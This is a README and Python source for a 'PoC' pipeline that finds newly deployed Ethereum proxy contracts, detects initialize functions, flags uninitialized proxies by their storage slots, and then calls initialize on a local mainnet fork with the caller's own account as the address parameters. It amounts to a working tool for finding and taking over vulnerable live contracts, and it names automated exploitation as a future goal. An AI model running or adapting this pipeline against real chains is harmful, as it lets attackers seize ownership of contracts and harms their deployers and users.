# PoC of Ethereum Proxy Contract Analysis & Exploitation Pipeline

## Introduction
This pipeline is designed to detect, analyze, and test uninitialized proxy contracts on the Ethereum mainnet. It focuses on identifying potential security vulnerabilities in upgradeable proxy contracts, particularly those that haven't been properly initialized, which could lead to unauthorized access or manipulation.

--- 

## Core Components

### 1. Contract Collection (`collect` mode)
- Scans Ethereum mainnet for newly deployed contracts
- Uses Infura RPC for blockchain interaction
- Stores contract addresses in SQLite database
- Tracks progress to enable resumable scanning
- Default scan range: last 10,000 blocks

### 2. Proxy Detection (`detect-proxy` mode)
Identifies proxy contracts using common patterns:
- EIP-1167 (Minimal Proxy)
- EIP-1967 (Transparent Proxy) -> I'm focusing on those one now
- EIP-1822 (Universal Upgradeable Proxy)

Features:
- Bytecode pattern matching
- Implementation address detection
- Storage slot analysis -> mainly check for slot0 and slot1 in proxy and implementation contract
- Delegatecall detection

### 3. Initialize Function Detection (`detect-signature` mode)
- Scans implementation bytecode for known initialize function signatures -> Reach me out to get the list of function signature!
- Maintains a database of common initialize function patterns
- Identifies potential initialization entry points
- Stores detected signatures for exploitation attempts

### 4. Storage Slot Analysis (`detect-slot-0` mode)
Analyzes key storage slots to determine initialization state:
- Proxy contract slots 0 and 1
- Implementation contract slots 0 and 1
- Interpretation of slot patterns:
  - UNINITIALIZED
  - PARTIAL INIT
  - NORMAL INIT
  - OZ NORMAL INIT
  - BOTH INITIALIZED
  - MISCONF INITIALIZED

### 5. Exploitation Testing (`exploit-test` mode)
Tests uninitialized contracts using:
- Local Anvil fork of mainnet
- Multiple initialize function patterns
- Parameter encoding for different types:
  - address
  - uint64
  - uint256
  - string
  - bool
- Storage change verification
- Transaction simulation
- Gas usage analysis

---

## Methodology

1. **Data Collection**
   - Scan blocks for contract creation
   - Store addresses in SQLite database
   - Track processing progress

2. **Proxy Analysis**
   - Detect proxy patterns in bytecode
   - Identify implementation addresses
   - Verify storage slots

3. **Vulnerability Detection**
   - Check for initialize functions
   - Verify initialization state
   - Analyze storage patterns

4. **Exploitation Testing**
   - Fork mainnet locally
   - Attempt initialization
   - Verify storage changes
   - Document results

## Usage

```bash
# Collect new contracts
python pipeline.py --mode collect

# Detect proxy contracts
python pipeline.py --mode detect-proxy

# Detect initialize functions
python pipeline.py --mode detect-signature

# Analyze storage slots
python pipeline.py --mode detect-slot-0

# Test exploitation
python pipeline.py --mode exploit-test
```

## Database Schema

The pipeline uses a SQLite database with the following structure:

```sql
CREATE TABLE contracts (
    address TEXT PRIMARY KEY,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    is_proxy BOOLEAN DEFAULT FALSE,
    proxy_type TEXT,
    implementation_address TEXT,
    proxy_bytecode TEXT,
    implementation_bytecode TEXT,
    detectedfuncsignature TEXT,
    detectedtextsignature TEXT,
    slot0impl TEXT,
    slot1impl TEXT,
    slot0proxy TEXT,
    slot1proxy TEXT,
    slot_interpretation TEXT
)
```

## Future Improvements Ideas

1. **Enhanced Detection**
   - More proxy patterns
   - Additional initialize function signatures
   - Improved storage pattern analysis

2. **Automation**
   - Continuous monitoring
   - Automated exploitation
   - Result reporting

3. **Analysis Tools**
   - Better visualization
   - Statistical analysis
   - Risk assessment

---

This pipeline is designed for security research and testing purposes only. Always ensure you have proper authorization before testing any contracts on mainnet.


---

```python3
from config import INFURA_RPC_URL
from web3 import Web3
import sqlite3
from datetime import datetime
import time
import argparse
import requests # Keep existing imports, might be used elsewhere or by user
import json   # Keep existing imports
from pathlib import Path

def init_database():
    conn = sqlite3.connect('contracts.db')
    cursor = conn.cursor()
    # Create contracts table with proxy information
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS contracts (
            address TEXT PRIMARY KEY,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_proxy BOOLEAN DEFAULT FALSE,
            proxy_type TEXT,
            implementation_address TEXT,
            proxy_bytecode TEXT,
            implementation_bytecode TEXT,
            detectedfuncsignature TEXT,
            detectedtextsignature TEXT,
            slot0impl TEXT,
            slot1impl TEXT,
            slot0proxy TEXT,
            slot1proxy TEXT,
            slot_interpretation TEXT
        )
    ''')
    
    # Add new columns if they don't exist (for existing databases)
    try:
        cursor.execute('ALTER TABLE contracts ADD COLUMN detectedfuncsignature TEXT')
    except sqlite3.OperationalError:
        pass  # Column already exists
    
    try:
        cursor.execute('ALTER TABLE contracts ADD COLUMN detectedtextsignature TEXT')
    except sqlite3.OperationalError:
        pass  # Column already exists
    
    try:
        cursor.execute('ALTER TABLE contracts ADD COLUMN slot0impl TEXT')
    except sqlite3.OperationalError:
        pass  # Column already exists
    
    try:
        cursor.execute('ALTER TABLE contracts ADD COLUMN slot1impl TEXT')
    except sqlite3.OperationalError:
        pass  # Column already exists
    
    try:
        cursor.execute('ALTER TABLE contracts ADD COLUMN slot0proxy TEXT')
    except sqlite3.OperationalError:
        pass  # Column already exists
    
    try:
        cursor.execute('ALTER TABLE contracts ADD COLUMN slot1proxy TEXT')
    except sqlite3.OperationalError:
        pass  # Column already exists
    
    try:
        cursor.execute('ALTER TABLE contracts ADD COLUMN slot_interpretation TEXT')
    except sqlite3.OperationalError:
        pass  # Column already exists
    
    # Create progress tracking table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS progress (
            id INTEGER PRIMARY KEY,
            last_processed_block INTEGER,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    return conn

def get_last_processed_block(cursor):
    cursor.execute('SELECT last_processed_block FROM progress ORDER BY id DESC LIMIT 1')
    result = cursor.fetchone()
    return result[0] if result else None

def update_last_processed_block(cursor, block_number):
    cursor.execute('INSERT INTO progress (last_processed_block) VALUES (?)', (block_number,))
    return block_number

def get_contract_addresses(start_block=None, batch_size=1000):
    # Connect to Ethereum network using Infura
    w3 = Web3(Web3.HTTPProvider(INFURA_RPC_URL))
    
    # Initialize database connection
    conn = init_database()
    cursor = conn.cursor()
    
    # Get the latest block number
    latest_block = w3.eth.block_number
    
    # Get the last processed block from database
    last_processed = get_last_processed_block(cursor)
    
    # Determine start block
    if start_block is None:
        if last_processed:
            start_block = last_processed + 1
        else:
            start_block = latest_block - 10000  # Start with last 10000 blocks if no previous progress
    
    # Get contract addresses from the specified range of blocks
    contract_addresses = []
    total_blocks_processed = 0
    
    try:
        for block_num in range(start_block, latest_block + 1):
            try:
                block = w3.eth.get_block(block_num, full_transactions=True)
                
                # Check each transaction in the block
                for tx in block.transactions:
                    # Contract creation transactions have 'to' address as None
                    if tx['to'] is None:
                        try:
                            receipt = w3.eth.get_transaction_receipt(tx['hash'])
                            if receipt['contractAddress']:
                                contract_address = receipt['contractAddress']
                                # Store in database
                                try:
                                    cursor.execute(
                                        'INSERT OR IGNORE INTO contracts (address) VALUES (?)',
                                        (contract_address,)
                                    )
                                    if cursor.rowcount > 0:  # If a new contract was actually inserted
                                        print(f"New contract found and stored: {contract_address} (Block: {block_num})")
                                        contract_addresses.append(contract_address)
                                except sqlite3.Error as e:
                                    print(f"Database error for address {contract_address}: {str(e)}")
                        except Exception as e:
                            print(f"Error getting receipt for tx {tx['hash'].hex()}: {str(e)}")
                
                total_blocks_processed += 1
                
                # Update progress every batch_size blocks
                if total_blocks_processed % batch_size == 0:
                    conn.commit()
                    update_last_processed_block(cursor, block_num)
                    print(f"\nProcessed blocks {block_num - batch_size + 1} to {block_num}. Found {len(contract_addresses)} new contracts.")
                    # Small delay to avoid rate limiting
                    time.sleep(0.1)
                
            except Exception as e:
                print(f"Error processing block {block_num}: {str(e)}")
                continue
    
    finally:
        # Update final progress and close connection
        if total_blocks_processed > 0:
            update_last_processed_block(cursor, block_num)
        conn.commit()
        conn.close()
    
    return contract_addresses, total_blocks_processed

def detect_proxy(addr):
    w3 = Web3(Web3.HTTPProvider(INFURA_RPC_URL))
    code = w3.eth.get_code(addr).hex()

    # Initialize the analysis result with default values
    analysis = {
        'address': addr,
        'is_proxy': False,
        'proxy_type': None,
        'code_size': 0,
        'has_delegatecall': False,
        'has_storage_slot': False,
        'has_implementation_slot': False,
        'has_admin_slot': False,
        'implementation_address': None,
        'proxy_bytecode': code,
        'implementation_bytecode': None
    }

    if not code or code == '0x':
        analysis['status'] = 'EOA or self-destructed'
        return analysis

    # Common proxy pattern signatures
    proxy_patterns = {
        'EIP-1167': '363d3d373d3d3d363d73',  # Minimal Proxy
        'EIP-1967': '360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc',  # Transparent Proxy
        'EIP-1822': 'a3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50',  # Universal Upgradeable Proxy
    }

    # Storage slots for implementation addresses
    implementation_slots = {
        'EIP-1967': '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc',
        'EIP-1822': '0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50'
    }

    # Update analysis with code size
    analysis['code_size'] = len(code) // 2

    # Check each proxy pattern
    for pattern_name, signature in proxy_patterns.items():
        if signature in code.lower():
            analysis['is_proxy'] = True
            analysis['proxy_type'] = pattern_name
            
            # Get implementation address for upgradeable proxies
            if pattern_name in implementation_slots:
                try:
                    slot = implementation_slots[pattern_name]
                    impl_address_raw = w3.eth.get_storage_at(addr, slot)
                    if impl_address_raw != b'\x00' * 32:  # Check if slot is not empty
                        # Convert to checksum address
                        raw_address_hex = '0x' + impl_address_raw.hex()[-40:]
                        analysis['implementation_address'] = Web3.to_checksum_address(raw_address_hex)
                        # Get implementation bytecode
                        impl_code = w3.eth.get_code(analysis['implementation_address']).hex()
                        analysis['implementation_bytecode'] = impl_code
                except Exception as e:
                    print(f"Error getting implementation address for {addr}: {str(e)}")
            break

    # Additional checks for proxy characteristics
    analysis.update({
        'has_delegatecall': 'f4' in code.lower(),  # DELEGATECALL opcode
        'has_storage_slot': '54' in code.lower(),  # SLOAD opcode (common in proxies)
        'has_implementation_slot': '360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc' in code.lower(),  # EIP-1967 implementation slot
        'has_admin_slot': 'b53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103' in code.lower(),  # EIP-1967 admin slot
    })

    # Update database if proxy is detected
    if analysis['is_proxy']:
        conn_db = sqlite3.connect('contracts.db')
        cursor_db = conn_db.cursor()
        try:
            cursor_db.execute('''
                UPDATE contracts 
                SET is_proxy = TRUE, 
                    proxy_type = ?,
                    implementation_address = ?,
                    proxy_bytecode = ?,
                    implementation_bytecode = ?
                WHERE address = ?
            ''', (
                analysis['proxy_type'], 
                analysis['implementation_address'],
                analysis['proxy_bytecode'],
                analysis['implementation_bytecode'],
                addr
            ))
            conn_db.commit()
            print("\n=== Proxy Detected ===")
            print(f"Proxy Address: {addr}")
            if analysis['implementation_address']:
                print(f"Implementation: {analysis['implementation_address']}")
            print(f"Pattern: {analysis['proxy_type']}")
            print("Updated in database")
            print("===================\n")
        except sqlite3.Error as e:
            print(f"Database error updating proxy info for {addr}: {str(e)}")
        finally:
            conn_db.close()

    return analysis

def load_signatures_from_file(file_path):
    signatures = {}
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    text_sig, hex_sig = line.split(':', 1)
                    signatures[text_sig] = hex_sig.lower().replace('0x', '')
        print(f"Loaded {len(signatures)} signatures from {file_path}")
    except FileNotFoundError:
        print(f"Error: Signatures file not found at {file_path}. Please run 'utils/collect_signatures.py' first.")
    except Exception as e:
        print(f"Error reading signatures file {file_path}: {e}")
    return signatures

def detect_uninitialized_contract():
    conn = sqlite3.connect('contracts.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT address, implementation_address, implementation_bytecode
        FROM contracts 
        WHERE proxy_type = 'EIP-1967' AND implementation_bytecode IS NOT NULL
    ''')
    
    proxies = cursor.fetchall()
    
    print(f"\n=== Analyzing {len(proxies)} EIP-1967 Proxy Contracts with Implementation Bytecode ===")
    
    signatures_file_path = Path(__file__).parent / 'utils' / 'initialize_signatures.txt'
    init_signatures = load_signatures_from_file(signatures_file_path)

    if not init_signatures:
        print("No initialize signatures loaded. Cannot proceed with detection.")
        print("Please ensure 'utils/initialize_signatures.txt' exists and is populated.")
        print("You can generate it by running 'python utils/collect_signatures.py'.")
        print("===============================\n")
        conn.close()
        return

    found_count = 0
    for proxy_address, impl_address, impl_bytecode in proxies:
        if not impl_bytecode: # Should be handled by SQL, but as a safeguard
            continue
            
        impl_bytecode_clean = impl_bytecode.lower().replace('0x', '')
            
        for text_signature, hex_signature in init_signatures.items():
            if hex_signature in impl_bytecode_clean:
                print(f"\nProxy Address: {proxy_address}")
                print(f"Implementation Address: {impl_address}")
                print(f"Text Signature: {text_signature}")
                print(f"Hex Signature: {hex_signature}")
                
                # Store the detected signatures in the database
                try:
                    cursor.execute('''
                        UPDATE contracts 
                        SET detectedfuncsignature = ?, detectedtextsignature = ?
                        WHERE address = ?
                    ''', (hex_signature, text_signature, proxy_address))
                    conn.commit()
                    print(f"Stored signatures in database for proxy {proxy_address}")
                except sqlite3.Error as e:
                    print(f"Database error storing signatures for {proxy_address}: {str(e)}")
                
                found_count += 1
                break 
    
    if found_count == 0:
        print("\nNo contracts found with known initialize function signatures in their implementation bytecode.")
    else:
        print(f"\nFound {found_count} implementation contracts with known initialize function signatures.")
        print(f"Stored signature data for {found_count} proxy contracts in database.")
    print("===============================\n")
    
    conn.close()

def analyze_stored_contracts():
    conn = sqlite3.connect('contracts.db')
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM contracts")
    total_contracts = cursor.fetchone()[0]
    print(f"Total contracts in database: {total_contracts}")
    
    print("\nAnalyzing contracts for proxy patterns...")
    cursor.execute("SELECT address FROM contracts")
    addresses_to_analyze = cursor.fetchall()
    
    proxy_count = 0
    for addr_tuple in addresses_to_analyze:
        analysis_result = detect_proxy(addr_tuple[0])
        if analysis_result['is_proxy']:
            proxy_count += 1
    
    print(f"\nFound {proxy_count} proxy contracts out of {total_contracts} total contracts")
    conn.close()

def interpret_slot_data(proxy_slot_0, proxy_slot_1, impl_slot_0, impl_slot_1):
    """
    Interpret slot data to determine initialization state and potential issues.
    
    Args:
        proxy_slot_0: Proxy contract slot 0 hex data
        proxy_slot_1: Proxy contract slot 1 hex data  
        impl_slot_0: Implementation contract slot 0 hex data
        impl_slot_1: Implementation contract slot 1 hex data
    
    Returns:
        String interpretation of the slot data analysis
    """
    # Check if slots are empty (all zeros) - without 0x prefix since get_storage_at returns hex without 0x
    empty_slot = "00" * 32
    
    proxy_slot_0_empty = proxy_slot_0 == empty_slot
    proxy_slot_1_empty = proxy_slot_1 == empty_slot
    impl_slot_0_empty = impl_slot_0 == empty_slot
    impl_slot_1_empty = impl_slot_1 == empty_slot
    
    # Case 1: All slots are 0 = uninitialized
    if proxy_slot_0_empty and proxy_slot_1_empty and impl_slot_0_empty and impl_slot_1_empty:
        return "UNINITIALIZED"
    
    # Case 2: Proxy slot 1 is not empty but all other slots are empty = partial init
    if not proxy_slot_1_empty and proxy_slot_0_empty and impl_slot_0_empty and impl_slot_1_empty:
        return "partial init"
    
    # Case 3: Both proxy slot 0 and proxy slot 1 are not empty = initialize
    if not proxy_slot_0_empty and not proxy_slot_1_empty:
        return "initialize"
    
    # Case 4: Proxy slot 0 ends with "1" and implementation slot 0 ends with "ff" = OZ normal init
    if proxy_slot_0.endswith("1") and impl_slot_0.endswith("ff"):
        return "OZ normal init"
    
    # Case 5: Proxy slot 0 equals implementation slot 0 (both non-zero addresses) = both initialized
    if not proxy_slot_0_empty and not impl_slot_0_empty and proxy_slot_0 == impl_slot_0:
        return "BOTH initialized"
    
    # Case 6: Implementation slot 0 not empty but proxy slot 0 empty = misconfiguration
    if not impl_slot_0_empty and proxy_slot_0_empty:
        return "MISCONF initialized via implementation"
    
    # All other cases = unknown
    return "Unknown"

def detect_slot_0():
    """
    Retrieve and store slot 0 and slot 1 data from implementation contracts and proxy contracts.
    """
    w3 = Web3(Web3.HTTPProvider(INFURA_RPC_URL))
    conn = sqlite3.connect('contracts.db')
    cursor = conn.cursor()
    
    # Get all proxy contracts with detected initialize signatures
    cursor.execute('''
        SELECT address, implementation_address, detectedfuncsignature, detectedtextsignature
        FROM contracts 
        WHERE implementation_address IS NOT NULL 
        AND detectedfuncsignature IS NOT NULL
        ORDER BY implementation_address, address
    ''')
    
    proxy_contracts = cursor.fetchall()
    
    print(f"\n=== Retrieving Slot Data for {len(proxy_contracts)} Proxy Contracts ===")
    
    if not proxy_contracts:
        print("No proxy contracts found with detected initialize signatures.")
        print("===============================\n")
        conn.close()
        return
    
    success_count = 0
    error_count = 0
    processed_implementations = set()
    
    for proxy_address, impl_address, hex_sig, text_sig in proxy_contracts:
        try:
            print(f"\nProxy Address: {proxy_address}")
            print(f"Implementation: {impl_address}")
            print(f"Detected Signature: {text_sig} ({hex_sig})")
            
            # Get slot 0 and slot 1 data from proxy contract
            proxy_slot_0 = w3.eth.get_storage_at(proxy_address, 0)
            proxy_slot_0_hex = proxy_slot_0.hex()
            
            proxy_slot_1 = w3.eth.get_storage_at(proxy_address, 1)
            proxy_slot_1_hex = proxy_slot_1.hex()
            
            print(f"Proxy Slot 0: {proxy_slot_0_hex}")
            print(f"Proxy Slot 1: {proxy_slot_1_hex}")
            
            # Get slot 0 and slot 1 data from implementation contract (only once per implementation)
            if impl_address not in processed_implementations:
                impl_slot_0 = w3.eth.get_storage_at(impl_address, 0)
                impl_slot_0_hex = impl_slot_0.hex()
                
                impl_slot_1 = w3.eth.get_storage_at(impl_address, 1)
                impl_slot_1_hex = impl_slot_1.hex()
                
                print(f"Implementation Slot 0: {impl_slot_0_hex}")
                print(f"Implementation Slot 1: {impl_slot_1_hex}")
                
                processed_implementations.add(impl_address)
            else:
                # Get existing implementation slot data from database
                cursor.execute('SELECT slot0impl, slot1impl FROM contracts WHERE implementation_address = ? AND slot0impl IS NOT NULL LIMIT 1', (impl_address,))
                result = cursor.fetchone()
                if result:
                    impl_slot_0_hex, impl_slot_1_hex = result
                    print(f"Implementation Slot 0: {impl_slot_0_hex} (cached)")
                    print(f"Implementation Slot 1: {impl_slot_1_hex} (cached)")
                else:
                    # Fallback: retrieve from blockchain
                    impl_slot_0 = w3.eth.get_storage_at(impl_address, 0)
                    impl_slot_0_hex = impl_slot_0.hex()
                    
                    impl_slot_1 = w3.eth.get_storage_at(impl_address, 1)
                    impl_slot_1_hex = impl_slot_1.hex()
                    
                    print(f"Implementation Slot 0: {impl_slot_0_hex}")
                    print(f"Implementation Slot 1: {impl_slot_1_hex}")
            
            # Interpret the slot data
            interpretation = interpret_slot_data(proxy_slot_0_hex, proxy_slot_1_hex, impl_slot_0_hex, impl_slot_1_hex)
            print(f"Interpretation: {interpretation}")
            
            # Store results in database
            cursor.execute('''
                UPDATE contracts 
                SET slot0impl = ?, slot1impl = ?, slot0proxy = ?, slot1proxy = ?, slot_interpretation = ?
                WHERE address = ?
            ''', (impl_slot_0_hex, impl_slot_1_hex, proxy_slot_0_hex, proxy_slot_1_hex, interpretation, proxy_address))
            
            success_count += 1
            
        except Exception as e:
            print(f"Error retrieving slot data for proxy {proxy_address}: {str(e)}")
            error_count += 1
            continue
    
    # Commit all updates
    conn.commit()
    conn.close()
    
    print(f"\n=== Summary ===")
    print(f"Total Proxy Contracts: {len(proxy_contracts)}")
    print(f"Successfully Retrieved: {success_count}")
    print(f"Errors: {error_count}")
    print("===============================\n")

def exploit_test():
    """
    Test connection to Anvil forked mainnet, verify uninitialized proxy contracts, and attempt exploitation.
    """
    # Connect to Anvil (default port 8545)
    anvil_url = "http://localhost:8545"
    w3 = Web3(Web3.HTTPProvider(anvil_url))
    
    # Check connection
    try:
        latest_block = w3.eth.block_number
        print(f"✓ Connected to Anvil forked mainnet. Latest block: {latest_block}")
    except Exception as e:
        print(f"✗ Error connecting to Anvil: {e}")
        print("Make sure Anvil is running with: anvil --fork-url <YOUR_RPC_URL>")
        return
    
    # Display account information
    try:
        accounts = w3.eth.accounts
        if accounts:
            default_account = accounts[0]
            balance = w3.eth.get_balance(default_account)
            balance_eth = w3.from_wei(balance, 'ether')
            print(f"✓ Using account: {default_account}")
            print(f"✓ Account balance: {balance_eth} ETH")
        else:
            print("✗ No accounts available")
            return
    except Exception as e:
        print(f"✗ Error getting account info: {e}")
        return
    
    # Get uninitialized proxy contracts from database
    conn = sqlite3.connect('contracts.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT address, implementation_address, detectedtextsignature, detectedfuncsignature, slot0proxy, slot1proxy
        FROM contracts 
        WHERE slot_interpretation = 'UNINITIALIZED' 
        AND implementation_address IS NOT NULL
        ORDER BY address
    ''')
    
    uninitialized_contracts = cursor.fetchall()
    conn.close()
    
    print(f"\n=== Verifying and Exploiting Uninitialized Proxy Contracts ===")
    
    if not uninitialized_contracts:
        print("No uninitialized proxy contracts found in database.")
        print("Run --mode detect-slot-0 first to analyze initialization states.")
        return
    
    print(f"Found {len(uninitialized_contracts)} uninitialized proxy contracts:\n")
    
    verified_count = 0
    exploited_count = 0
    error_count = 0
    
    for i, (proxy_address, impl_address, text_sig, hex_sig, slot0_proxy, slot1_proxy) in enumerate(uninitialized_contracts, 1):
        print(f"{i}. Proxy Address: {proxy_address}")
        print(f"   Implementation: {impl_address}")
        print(f"   Initialize Function: {text_sig}")
        print(f"   Function Selector: 0x{hex_sig}")
        
        try:
            # Read current slot values from blockchain
            proxy_slot_0_before = w3.eth.get_storage_at(proxy_address, 0)
            proxy_slot_1_before = w3.eth.get_storage_at(proxy_address, 1)
            impl_slot_0_before = w3.eth.get_storage_at(impl_address, 0)
            impl_slot_1_before = w3.eth.get_storage_at(impl_address, 1)
            
            # Convert to hex strings for comparison
            proxy_slot_0_hex = proxy_slot_0_before.hex()
            proxy_slot_1_hex = proxy_slot_1_before.hex()
            impl_slot_0_hex = impl_slot_0_before.hex()
            impl_slot_1_hex = impl_slot_1_before.hex()
            
            print(f"   Current Proxy Slot 0: {proxy_slot_0_hex}")
            print(f"   Current Proxy Slot 1: {proxy_slot_1_hex}")
            print(f"   Current Impl Slot 0:  {impl_slot_0_hex}")
            print(f"   Current Impl Slot 1:  {impl_slot_1_hex}")
            
            # Verify all slots are zero
            proxy_slot_0_zero = proxy_slot_0_hex == "00" * 32
            proxy_slot_1_zero = proxy_slot_1_hex == "00" * 32
            impl_slot_0_zero = impl_slot_0_hex == "00" * 32
            impl_slot_1_zero = impl_slot_1_hex == "00" * 32
            
            all_slots_zero = proxy_slot_0_zero and proxy_slot_1_zero and impl_slot_0_zero and impl_slot_1_zero
            
            if all_slots_zero:
                print(f"   ✓ VERIFIED: All slots are zero - contract is uninitialized")
                verified_count += 1
                
                # Attempt exploitation
                print(f"   ATTEMPTING EXPLOITATION...")
                
                # Prepare transaction data based on function signature
                function_data = f"0x{hex_sig}"
                
                # Add dummy parameters based on signature
                if "uint64" in text_sig:
                    # Add dummy uint64 parameter (value: 1)
                    function_data += "0000000000000000000000000000000000000000000000000000000000000001"
                
                if "address" in text_sig:
                    # Add dummy address parameters (use our account)
                    address_count = text_sig.count("address")
                    for _ in range(address_count):
                        function_data += default_account[2:].zfill(64)  # Remove 0x and pad to 64 chars
                
                if "uint256" in text_sig:
                    # Add dummy uint256 parameters (value: 1000)
                    uint256_count = text_sig.count("uint256")
                    for _ in range(uint256_count):
                        function_data += "00000000000000000000000000000000000000000000000000000000000003e8"  # 1000 in hex
                
                if "string" in text_sig:
                    # Add dummy string parameter
                    string_data = "ExploitTest"
                    string_hex = string_data.encode().hex().ljust(64, '0')
                    string_offset = "0000000000000000000000000000000000000000000000000000000000000020"  # offset 32
                    string_length = f"{len(string_data):064x}"  # length
                    function_data += string_offset + string_length + string_hex
                
                if "bool" in text_sig:
                    # Add dummy bool parameters (true)
                    bool_count = text_sig.count("bool")
                    for _ in range(bool_count):
                        function_data += "0000000000000000000000000000000000000000000000000000000000000001"  # true
                
                print(f"   Transaction data: {function_data}")
                
                # Attempt to call the initialize function
                try:
                    tx_hash = w3.eth.send_transaction({
                        'from': default_account,
                        'to': proxy_address,
                        'data': function_data,
                        'gas': 500000,
                        'gasPrice': w3.to_wei('20', 'gwei')
                    })
                    
                    # Wait for transaction receipt
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                    print(f"   ✓ Transaction successful! Hash: {tx_hash.hex()}")
                    print(f"   Gas used: {receipt.gasUsed}")
                    
                    # Read storage slots after initialization
                    proxy_slot_0_after = w3.eth.get_storage_at(proxy_address, 0)
                    proxy_slot_1_after = w3.eth.get_storage_at(proxy_address, 1)
                    impl_slot_0_after = w3.eth.get_storage_at(impl_address, 0)
                    impl_slot_1_after = w3.eth.get_storage_at(impl_address, 1)
                    
                    print(f"   === AFTER EXPLOITATION ===")
                    print(f"   Proxy Slot 0: {proxy_slot_0_after.hex()}")
                    print(f"   Proxy Slot 1: {proxy_slot_1_after.hex()}")
                    print(f"   Impl Slot 0:  {impl_slot_0_after.hex()}")
                    print(f"   Impl Slot 1:  {impl_slot_1_after.hex()}")
                    
                    # Check if storage changed
                    proxy_changed = (proxy_slot_0_before != proxy_slot_0_after or 
                                   proxy_slot_1_before != proxy_slot_1_after)
                    impl_changed = (impl_slot_0_before != impl_slot_0_after or 
                                  impl_slot_1_before != impl_slot_1_after)
                    
                    if proxy_changed or impl_changed:
                        print(f"   EXPLOITATION SUCCESSFUL! Storage slots changed:")
                        if proxy_changed:
                            print(f"     - Proxy storage modified")
                        if impl_changed:
                            print(f"     - Implementation storage modified")
                        exploited_count += 1
                    else:
                        print(f"   WARNING: Transaction succeeded but no storage changes detected")
                    
                except Exception as tx_error:
                    print(f"   ✗ EXPLOITATION FAILED: {str(tx_error)}")
                    
                    # Try to get more details about the failure
                    try:
                        w3.eth.call({
                            'from': default_account,
                            'to': proxy_address,
                            'data': function_data
                        })
                        print(f"   Call simulation succeeded - transaction failure may be gas related")
                    except Exception as call_error:
                        print(f"   Call simulation also failed: {str(call_error)}")
                
            else:
                print(f"   ✗ WARNING: Not all slots are zero!")
                if not proxy_slot_0_zero:
                    print(f"     - Proxy Slot 0 is not zero: {proxy_slot_0_hex}")
                if not proxy_slot_1_zero:
                    print(f"     - Proxy Slot 1 is not zero: {proxy_slot_1_hex}")
                if not impl_slot_0_zero:
                    print(f"     - Implementation Slot 0 is not zero: {impl_slot_0_hex}")
                if not impl_slot_1_zero:
                    print(f"     - Implementation Slot 1 is not zero: {impl_slot_1_hex}")
            
        except Exception as e:
            print(f"   ✗ ERROR: Failed to process contract: {str(e)}")
            error_count += 1
        
        print("-" * 80)
    
    print("=" * 80)
    print(f"EXPLOITATION SUMMARY:")
    print(f"Total contracts checked: {len(uninitialized_contracts)}")
    print(f"Verified uninitialized: {verified_count}")
    print(f"Successfully exploited: {exploited_count}")
    print(f"Errors: {error_count}")
    print("=" * 80)

def main():
    parser = argparse.ArgumentParser(description='Ethereum Contract Analysis Pipeline')
    parser.add_argument('--mode', choices=['collect', 'detect-proxy', 'both', 'detect-signature', 'detect-slot-0', 'exploit-test'],
                      required=True, # Made mode required as default was removed
                      help='Pipeline mode: collect new contracts, detect proxies, both, detect initialize function signatures, or check initialization state')
    parser.add_argument('--blocks', type=int, default=10000,
                      help='Number of blocks to process in collect mode (default: 10000)')
    
    args = parser.parse_args()
    
    if args.mode in ['collect', 'both']:
        print("Starting contract address collection...")
        contracts, blocks_processed = get_contract_addresses()
        print(f"\nCollection complete!")
        print(f"Processed {blocks_processed} blocks")
        print(f"Found and stored {len(contracts)} new contracts")
    
    if args.mode in ['detect-proxy', 'both']:
        analyze_stored_contracts()
        
    if args.mode == 'detect-signature':
        detect_uninitialized_contract()
    
    if args.mode == 'detect-slot-0':
        detect_slot_0()

    if args.mode == 'exploit-test':
        exploit_test()

if __name__ == "__main__":
    main()

```
